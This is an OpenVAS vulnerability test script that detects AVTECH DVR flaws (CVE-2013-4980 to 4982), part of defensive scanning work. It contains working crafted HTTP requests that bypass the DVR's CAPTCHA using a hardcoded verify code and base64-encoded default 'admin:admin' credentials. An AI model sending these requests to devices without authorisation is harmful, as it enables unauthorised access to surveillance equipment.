###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_avtech_dvr_multiple_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# AVTECH DVR Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");

if(description)
{
  script_id(803768);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2013-4980", "CVE-2013-4981", "CVE-2013-4982");
  script_bugtraq_id(62035, 62037, 62033);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-10-07 16:31:24 +0530 (Mon, 07 Oct 2013)");
  script_name("AVTECH DVR Multiple Vulnerabilities");

   tag_summary =
"This host is running AVTECH DVR and is prone to multiple vulnerabilities.";

  tag_vuldetect =
"Send crafted HTTP GET request and check it is possible bypass the captcha
verification or not.";

  tag_insight =
"Multiple flaws are due to,
 - The device sending 10 hardcoded CAPTCHA requests after an initial
   purposefully false CAPTCHA request.
 - An user-supplied input is not properly validated when handling RTSP
   transactions.
 - An user-supplied input is not properly validated when handling input
   passed via the 'Network.SMTP.Receivers' parameter to the
   /cgi-bin/user/Config.cgi script.";

  tag_impact =
"Successful exploitation will allow remote attacker to bypass CAPTCHA
requests, cause a buffer overflow resulting in a denial of service or
potentially allowing the execution of arbitrary code.

Impact Level: System/Application";

  tag_affected =
"DVR 4CH H.264 (AVTECH AVN801) firmware 1017-1003-1009-1003";

  tag_solution =
"No solution or patch is available as of 07th October, 2013. Information
regarding this issue will be updated once the solution details are available.
For updates refer to http://www.avtech.com.tw ";

 desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "impact" , value : tag_impact);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://www.osvdb.org/96698");
  script_xref(name : "URL" , value : "http://www.osvdb.org/96692");
  script_xref(name : "URL" , value : "http://www.osvdb.org/96693");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/27942");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2013/Aug/284");
  script_xref(name : "URL" , value : "http://www.coresecurity.com/advisories/avtech-dvr-multiple-vulnerabilities");
  script_summary("check it is possible bypass the captcha verification or not.");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");

## Variable Initialization
host ="";
banner = "";
result = "";
dvrPort = "";

## Get HTTP Port
dvrPort = get_http_port(default:80);
if(!dvrPort){
  dvrPort = 80;
}

## Check Port Status
if(!get_port_state(dvrPort)){
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port:dvrPort);
if(!banner || banner !~ "Server:.*Avtech"){
  exit(0);
}

host = get_host_name();

## Construct the request with captcha value
req = 'GET //cgi-bin/nobody/VerifyCode.cgi?account=YWRtaW46YWRtaW4' +
      '=&captcha_code=FMUA&verify_code=FMUYyLOivRpgc HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n\r\n';

result = http_send_recv(port:dvrPort, data:req);
if("ERROR: Verify Code is incorrect" >< result)
{

 ## Construct the request with invalid captcha value
 req = 'GET //cgi-bin/nobody/VerifyCode.cgi?account=YWRtaW46YWRtaW4' +
       '=&captcha_code=FMUF&verify_code=FMUYyLOivRpgc HTTP/1.1\r\n' +
       'Host: ' + host + '\r\n\r\n';
 result = http_send_recv(port:dvrPort, data:req);

 ## Confirm the exploit
 if("0 OK" >< result &&  result =~ "Set-Cookie: SSID.*path" &&
    "ERROR: Verify Code is incorrect" >!< result)
 {
   security_hole(port:dvrPort);
   exit(0);
 }
}
